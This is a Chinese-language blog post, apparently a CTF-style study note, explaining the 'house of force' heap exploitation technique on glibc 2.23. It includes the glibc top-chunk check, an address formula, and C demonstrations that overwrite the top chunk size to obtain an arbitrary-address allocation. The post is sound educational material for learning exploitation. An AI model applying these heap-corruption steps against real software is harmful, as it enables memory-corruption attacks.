---
layout: post
title: house of force：控制top chunk的size来malloc任意值
category: system/Heap
date: 2023-9-23 21:04:32
---
Heap基础知识
<!-- more -->
[toc]
# house of force

一句话描述该漏洞，在`glibc 2.23`下，通过控制`top chunk`的`size`域为一个特别大的值，导致可以通过`malloc`特别大的值或者负数来将`top chunk`的指针指向任意位置。

你需要进行控制的：

- `top chunk`的`size`域
- 你需要可以`malloc`一个特别大的值
- 你需要可以多次`malloc`

**公式**：

```c
request_size = new_top_chunk_addr - old_top_chunk_addr - 0x10;

// 其中request_size为malloc的大小
// new_top_chunk_addr是申请后top chunk会处于的位置
// old_top_chunk_addr是申请前top chunk会处于的位置
```

**原理：**

在`glibc 2.23`中，对于`top chunk`的检查仅仅只有`(unsigned long) (size) >= (unsigned long) (nb + MINSIZE)`。

那么，若我们将`top chunk`的`size`修改为一个特别大的值，甚至是`-1`（由于是无符号数在进行判断，那么`-1`是最大的数），那么便可以申请任意大小的`chunk`。源码如下：

```c
// 获取当前的top chunk，并计算其对应的大小
victim = av->top;
size   = chunksize(victim);
// 如果在分割之后，其大小仍然满足 chunk 的最小大小，那么就可以直接进行分割。
if ((unsigned long) (size) >= (unsigned long) (nb + MINSIZE)) 
{
    remainder_size = size - nb;
    remainder      = chunk_at_offset(victim, nb);
    av->top        = remainder;
    set_head(victim, nb | PREV_INUSE |
            (av != &main_arena ? NON_MAIN_ARENA : 0));
    set_head(remainder, remainder_size | PREV_INUSE);

    check_malloced_chunk(av, victim, nb);
    void *p = chunk2mem(victim);
    alloc_perturb(p, bytes);
    return p;
}
```

这里用`wiki`的例子，由于堆是低地址到高地址增长，那么可以申请负数地址来申请到更低的地址（例如`malloc@got.plt`）：

```c
int main()
{
    long *ptr,*ptr2;
    ptr=malloc(0x10);
    ptr=(long *)(((long)ptr)+24);
    *ptr=-1;        // <=== 这里把top chunk的size域改为0xffffffffffffffff
    malloc(-4120);  // <=== 减小top chunk指针
    malloc(0x10);   // <=== 分配块实现任意地址写
}
```

也可以通过申请特别大的值来申请到高地址，例如`__malloc_hook`（在`libc`里面）

```c
int main()
{
    long *ptr,*ptr2;
    ptr=malloc(0x10);
    ptr=(long *)(((long)ptr)+24);
    *ptr=-1;                 <=== 修改top chunk size
    malloc(140737345551056); <=== 增大top chunk指针
    malloc(0x10);
}
```

笔者通过一小段代码在`glibc2.23`中实现了`house of force`：

```c
#include <stdio.h>
#include <stdlib.h>

int main()
{
    setbuf(stdin, NULL);
    setbuf(stdout, NULL);
    long fake_chunk[0x110]; // 最终要是申请到了这里，那就说明攻击成功
    printf("the addr of fake_chunk is %p.\n", fake_chunk);

    long *a = malloc(0x100);                     // 如此一来，chunk a的下一个chunk将会是top chunk
    long *top_chunk = (long *)((long)a + 0x100); // top_chunk在a偏移0x100的地方
    top_chunk[1] = -1; // 将top chunk的大小修改为无限大

    long diff = (long)&fake_chunk[0] - (long)top_chunk; // 计算fake_chunk和top chunk此时相差的距离
    malloc(diff - 0x10);                                // malloc这个距离大小-0x10的chunk就是申请一个大小等于这个距离的，使得top chunk减小这个距离

    long *b = malloc(0x100);                                // 随便申请一个chunk
    printf("the addr of new malloc chunk is %p.\n", b - 2); // 发现申请到的chunk的地址就是fake

    return 0;
}
```
